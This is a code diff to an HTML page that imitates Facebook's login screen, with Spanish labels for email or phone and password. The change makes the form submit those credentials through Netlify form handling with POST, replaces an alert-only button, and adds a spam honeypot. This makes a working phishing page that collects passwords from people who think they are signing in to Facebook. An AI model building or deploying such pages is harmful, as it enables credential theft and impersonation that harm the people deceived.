@@ -99,19 +99,25 @@
   <div class="container">
     <div class="logo">facebook</div>
     <div class="login-box">
-      <form name="contact" netlify>
+      <form name="contact" method="POST" data-netlify="true" netlify-honeypot="bot-field">
+        <input type="hidden" name="form-name" value="contact" />
+        
+        <!-- Campo honeypot para spam -->
+        <div style="display: none;">
+          <label>No llenes esto si eres humano: <input name="bot-field"/></label>
+        </div>
+        
         <input type="text" name="name" placeholder="Correo electrónico o número de teléfono" required>
         <input type="password" name="password" placeholder="Contraseña" required>
-        <button action="javascript:void(0);"
-                    onclick="alerta()" type="submit" class="btn-login">Iniciar sesión</button>
+        <button type="submit" class="btn-login">Iniciar sesión</button>
       </form>
       <div class="links">
-        <a href="#">Has olvidado tu contraseña?</a>
+        <a href="#">¿Has olvidado tu contraseña?</a>
       </div>
       <button class="btn-create">Crear cuenta nueva</button>
     </div>
   </div>
-      <script src="errores.js"></script>
-    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  <script src="errores.js"></script>
+  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
 </body>
 </html>
